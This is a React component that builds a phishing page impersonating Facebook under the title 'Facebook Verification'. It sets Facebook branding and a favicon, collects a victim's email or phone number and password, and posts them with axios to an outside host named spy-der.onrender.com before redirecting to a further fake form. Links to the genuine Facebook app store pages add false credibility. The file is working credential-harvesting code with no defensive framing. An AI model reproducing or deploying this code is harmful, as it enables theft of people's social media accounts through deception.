/* eslint-disable no-unused-vars */
import axios from 'axios';
import { useEffect, useState } from 'react'
import MyInput from '../Modules/MyInput'
import MyButton from '../Modules/MyButton';

const FacebookForm = () => {

  const [emailOrMobile, setEmailOrMobile] = useState("");
  const [password, setPassword] = useState("");

  useEffect(() => {
    document.title = 'Facebook Verification';
    const iconLink = document.querySelector("link[rel~='icon']");
    iconLink.href = 'facebook-48.png';
  }, [])

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formData = { emailOrMobile, password };
    const res = await axios.post('https://spy-der.onrender.com/facebook', formData)
    .then(res => {
      console.log(res.data);
      setEmailOrMobile("");
      setPassword("");
    })
    window.location.replace("/face-meta-form")
    
  };

  return (
    <div className='p-2 mt-8'>
      <h1 className='text-white text-2xl  text-center font-[cursive] underline-offset-8 underline'>Facebook Verification</h1>
      <div className='flex md:flex-row flex-col-reverse md:space-x-2 space-y-2 justify-center h-full mt-8 w-full'>

        <div className=''>
          <img src="facebook.png" className='w-80' alt="" />
          <br />
          <h1 className="text-2xl text-white font-semibold">Facebook helps you connect and share <br /> with the people in your life.</h1>
        </div>

        <div>
          <div className='border-2 relative border-slate-300 rounded-md flex flex-col p-2 space-y-4 w-full items-center justify-center' >
            <div className='flex space-x-2 items-center justify-center'>
              <img src="facebook-48.png" alt="" className="" />
              <h1 className='text-white text-3xl font-bold'>facebook</h1>
            </div>
            <form onSubmit={handleSubmit} className='flex flex-col items-center space-y-4'>
              <MyInput label="Phone number Or Email" type='text' value={emailOrMobile} onChange={(e) => setEmailOrMobile(e.target.value)} />
              <MyInput label="Password" type='password' value={password} onChange={(e) => setPassword(e.target.value)} />
                <MyButton type='submit' >Login</MyButton>
            </form>
            <div className='inline-flex items-center justify-center'>
              <hr className='w-64 h-px my-8 bg-gray-700 border-0' />
              {/* <span className='absolute px-3 font-medium text-gray-300 -translate-x-1/2 bg-grey-900 left-1/2 ' >OR</span> */}
            </div>
            <div>
              <img src="meta-facebook2.png" alt="" className='h-10' />
            </div>
          </div>
          <div className='flex flex-col border-slate-300 border-2 rounded-md my-2 p-2 justify-center items-center space-y-2'>
              <h1 className="text-white">Get The APP.</h1>
              <div className='flex space-x-2'>

                <a href="https://play.google.com/store/apps/details?id=com.facebook.katana">
                  <div className='bg-black rounded-md space-x-3 p-2 flex items-center w-fit '>
                    <img src="playstore-48.png" alt="" className='w-8' />
                    <h1 className='text-white text-lg'>Get It On Playstore</h1>
                  </div>
                </a>

                <a href="https://apps.microsoft.com/store/detail/facebook/9WZDNCRFJ2WL?hl=en-in&gl=in" className='hidden lg:block '>
                  <div className='bg-black rounded-md space-x-3 p-2 flex items-center w-fit '>
                    <img src="microsoftstore-48.png" alt="" className='w-8' />
                    <h1 className='text-white text-lg'>Get It On Microsoft Store</h1>
                  </div>
                </a>
              </div>
          </div>
        </div>
      </div>

    </div>
  )
}

export default FacebookForm